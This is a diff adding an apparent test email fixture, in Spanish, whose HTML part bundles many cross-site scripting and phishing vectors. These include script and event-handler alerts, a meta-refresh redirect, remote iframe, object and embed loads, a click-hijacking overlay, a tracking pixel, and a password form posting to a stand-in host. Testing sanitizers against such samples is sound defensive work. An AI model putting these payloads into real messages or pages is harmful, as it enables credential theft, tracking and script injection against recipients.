@@ -1,0 +1,34 @@
+From: Aviso <aviso@servicio-ejemplo.example>
+To: persona.reportante@universidad-ejemplo.example
+Subject: Vector de XSS
+Date: Tue, 10 Nov 2026 17:36:00 -0600
+Message-ID: <fx018@ejemplo.invalid>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============1657036754096453047=="
+
+--===============1657036754096453047==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 8bit
+
+Versión en texto plano.
+
+--===============1657036754096453047==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><head><meta http-equiv=3D"refresh" content=3D"0;url=3Dhttp://203.0.113.=
+45/"><link rel=3D"stylesheet" href=3D"http://203.0.113.45/x.css"><style>body{=
+background:url(javascript:alert(1))} @import url(http://203.0.113.45/i.css);<=
+/style></head><body><p>Texto visible leg=C3=ADtimo.</p><script>alert("xss1")<=
+/script><img src=3D"x" onerror=3D"alert(2)"><iframe src=3D"http://203.0.113.4=
+5/f"></iframe><svg onload=3D"alert(3)"><script>alert(4)</script></svg><form a=
+ction=3D"http://203.0.113.45/post"><input name=3D"u"><input type=3D"password"=
+ name=3D"p"></form><object data=3D"http://203.0.113.45/o"></object><embed src=
+=3D"http://203.0.113.45/e"><a href=3D"http://203.0.113.45/" onclick=3D"alert(=
+5)" style=3D"position:fixed;top:0;left:0;width:100%;height:100%">clic</a><bas=
+e href=3D"http://203.0.113.45/"><img src=3D"http://203.0.113.45/track.gif"></=
+body></html>
+
+--===============1657036754096453047==--
